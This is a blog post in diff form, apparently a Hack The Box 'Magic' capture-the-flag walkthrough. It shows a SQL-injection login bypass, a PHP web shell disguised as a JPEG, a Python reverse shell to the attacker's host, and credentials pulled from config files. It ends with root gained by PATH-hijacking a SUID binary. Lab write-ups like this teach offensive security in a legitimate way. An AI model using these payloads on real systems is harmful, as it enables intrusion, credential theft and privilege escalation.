@@ -1,0 +1,255 @@
+---
+layout: post
+title:  "Hack The Box - Magic"
+date:   2020-08-23 00:38:00 +0800
+categories: hackthebox linux sqli php magic path
+---
+
+![](/assets/images/magic.png){:height="414px" width="615px"}
+
+# Configuration
+
+The operating system that I will be using to tackle this machine is a Kali Linux VM.
+
+What I learnt from other writeups is that it was a good habit to map a domain name to the machine's IP address so as that it will be easier to remember. This can done by appending a line to `/etc/hosts`.
+
+{% highlight bash %}
+$ echo "10.10.10.185 magic.htb" >> /etc/hosts
+{% endhighlight %}
+
+# Reconnaissance
+
+Using `nmap`, we are able to determine the open ports and running services on the machine.
+{% highlight bash %}
+$ nmap -sV -sT -sC magic.htb
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-28 11:51 EDT
+Nmap scan report for magic.htb (10.10.10.185)
+Host is up (0.18s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
+|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
+|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Magic Portfolio
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 31.77 seconds
+
+{% endhighlight %}
+
+# Enumeration (1)
+
+We got no credentials for the `ssh` service on port `22` so let check out the `http` service on port `80`.
+
+![](/assets/images/magic1.png)
+
+On the bottom left, there's a link to a login page.
+
+`http://magic.htb/login.php`:
+
+![](/assets/images/magic2.png)
+
+I threw in some basic `SQL` injection by putting `' or 1=1;--` in both the username and password and I got in? Nice.
+
+`http://magic.htb/upload.php`:
+
+![](/assets/images/magic3.png)
+
+I submitted nothing and I got this error:
+
+![](/assets/images/magic4.png)
+
+So, the application wants me to support an image. However, based on experience, file upload pages are usually a place where bugs commonly occur so lets see how can we bypass the protections in place.
+
+First, lets first create our web shell. If we manage to upload this, we basically can run any commands on the box!
+
+{% highlight bash %}
+$ cat shell.php
+<?php
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd']);
+    }
+?>
+{% endhighlight %}
+
+Lets think about what kind of checks might be in place. Maybe they are checking the file extension?
+
+{% highlight bash %}
+$ mv shell.php shell.php.jpeg
+{% endhighlight %}
+
+![](/assets/images/magic5.png)
+
+They probably are but its still not good enough... Well since this box is called "Magic", perhaps they are checking the magic bytes of the file uploaded? The magic bytes of a file is used to identify what type of file it is so that the system can properly interpret it and process accordingly. We can use the `file` command to see what our file is interpreted as.
+
+{% highlight bash %}
+$ file shell.php.jpeg
+shell.php.jpeg: PHP script, ASCII text
+{% endhighlight %}
+
+Well, our file is definitely not recognized as a `JPEG` file. According to this [link](https://www.filesignatures.net/index.php?page=search&search=JFIF&mode=EXT), the magic bytes of a `JPEG` file is `FF D8 FF E0`. Hence, we can just append these bytes to the front of our file.
+
+{% highlight bash %}
+$ echo -e "$(python -c "print '\xFF\xD8\xFF\xE0'")$(cat shell.php.jpeg)" > shell.php.jpeg
+$ file shell.php.jpeg
+shell.php.jpeg: JPEG image data
+{% endhighlight %}
+
+Now lets try uploading it.
+
+![](/assets/images/magic6.png)
+
+Now lets figure out where does our file end up at. If you go back to the home page and right-click on the images and click on "View Image", you will see that uploaded images are saved to `http://magic.htb/images/uploads/`. So, lets see if our web shell is there! Note that the uploaded files get cleared every now and then so you might need to reupload your web shell again to see it.
+
+`http://magic.htb/images/uploads/shell.php.jpeg`:
+
+![](/assets/images/magic7.png)
+
+These weird characters that you see are actually the magic bytes you added to our web shell! If we add the `?cmd=whoami` to the end of our URL,
+
+`http://magic.htb/images/uploads/shell.php.jpeg?cmd=whoami`:
+
+![](/assets/images/magic8.png)
+
+We see that we can now arbitrary commands! The next step is probably to establish a more stable reverse shell since our web shell will get deleted every now and then. Since Python 3 was installed on the box (You can run `which python3` to see if it is installed), we can execute a python reverse shell.
+
+Starting our listener...
+
+{% highlight bash %}
+$ nc -lvnp 1337
+listening on [any] 1337 ...
+{% endhighlight %}
+
+And by visiting `http://magic.htb/images/uploads/shell.php.jpeg?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.XX.XX",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`,
+
+We now have a reverse shell.
+
+{% highlight bash %}
+connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.185] 48482
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ python3 -c "import pty;pty.spawn('/bin/bash')"
+www-data@ubuntu:/var/www/Magic/images/uploads$
+{% endhighlight %}
+
+As `www-data`, we can check out what files are there in the root directory of the web service. In `/var/www/Magic`, there were 2 files of interest.
+
+{% highlight bash %}
+www-data@ubuntu:/var/www/Magic/images/uploads$ cat /var/www/Magic/db.php5
+<?php
+class Database
+{
+    private static $dbName = 'Magic' ;
+    private static $dbHost = 'localhost' ;
+    private static $dbUsername = 'theseus';
+    private static $dbUserPassword = 'iamkingtheseus';
+...
+{% endhighlight %}
+
+{% highlight bash %}
+www-data@ubuntu:/var/www/Magic/images/uploads$ cat /var/www/Magic/backup.sql
+...
+INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
+...
+{% endhighlight %}
+`
+We got 2 usernames, `theseus` and `admin`, and 2 passwords, `iamkingtheseus` and `Th3s3usW4sK1ng`. Let see what users we have in `/home`.
+
+{% highlight bash %}
+$ ls /home
+theseus
+{% endhighlight %}
+
+# user.txt
+
+I guess we now know what to do. Using the 2 passwords we found, we manage to `su` to `theseus`.
+
+{% highlight bash %}
+www-data@ubuntu:/var/www/Magic/images/uploads$ su theseus
+Th3s3usW4sK1ng
+theseus@ubuntu:/var/www/Magic/images/uploads$ cat /home/theseus/user.txt
+a9aaXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+{% endhighlight %}
+
+# Enumeration (2)
+
+Lets run [`LinEnum.sh`](https://github.com/rebootuser/LinEnum) to see we can find anything to help use escalate our privileges.
+
+{% highlight bash %}
+theseus@ubuntu:/var/www/Magic/images/uploads$ wget http://10.10.XX.XX/LinEnum.sh
+--2020-08-22 04:59:07--  http://10.10.XX.XX/LinEnum.sh
+Connecting to 10.10.XX.XX:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 46476 (45K) [text/x-sh]
+Saving to: ‘LinEnum.sh’
+
+LinEnum.sh                                100%[========================================================>]  45.39K  85.5KB/s    in 0.5s    
+
+2020-08-22 04:59:08 (85.5 KB/s) - ‘LinEnum.sh’ saved [46476/46476]
+
+theseus@ubuntu:/tmp$ chmod +x LinEnum.sh
+...
+[-] SUID files:
+...
+-rwsr-x--- 1 root users 22040 Oct 21  2019 /bin/sysinfo
+...
+{% endhighlight %}
+
+`sysinfo` is not a binary commonly found in Linux distributions so lets look into it. When executing it, it prints information related to your memory, your disk and your CPU information. But if we look deeper into it,
+
+{% highlight bash %}
+theseus@ubuntu:/tmp$ ltrace /bin/sysinfo 2>&1 | grep popen
+ltrace /bin/sysinfo 2>&1 | grep popen
+popen("lshw -short", "r")                        = 0x5579b300ee80
+popen("fdisk -l", "r")                           = 0x5579b300ee80
+popen("cat /proc/cpuinfo", "r")                  = 0x5579b300ee80
+popen("free -h", "r")                            = 0x5579b300ee80
+{% endhighlight %}
+
+It is actually running other commands to retrieve the above said information! Since the path of the binaries executed is not full, we can manipulate our `$PATH` variable so that our own code will be executed instead of the legitimate binary! We got 4 choices but I will choose `free`.
+
+Preparing our payload:
+
+{% highlight bash %}
+theseus@ubuntu:/tmp$ echo "/bin/bash" >> /tmp/free
+theseus@ubuntu:/tmp$ chmod +x free
+{% endhighlight %}
+
+Manipulating our `$PATH` variable so that the OS will check `/tmp` for `free`:
+
+{% highlight bash %}
+theseus@ubuntu:/tmp$ PATH=/tmp:$PATH
+theseus@ubuntu:/tmp$ echo $PATH
+/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
+{% endhighlight %}
+
+And now finally, if we run `/bin/sysinfo`:
+
+{% highlight bash %}
+theseus@ubuntu:/tmp$ /bin/sysinfo
+====================Hardware Info====================
+root@ubuntu:/tmp#
+{% endhighlight %}
+
+# root.txt
+
+We are now root! However, the output of commands will not be printed until I exit the current shell.
+
+{% highlight bash %}
+root@ubuntu:/tmp# cat /root/root.txt
+cat /root/root.txt
+root@ubuntu:/tmp# exit
+exit
+exit
+4328XXXXXXXXXXXXXXXXXXXXXXXXXXXX
+theseus@ubuntu:/tmp$
+{% endhighlight %}
+
+Rooted ! Thank you for reading and look forward for more writeups and articles !
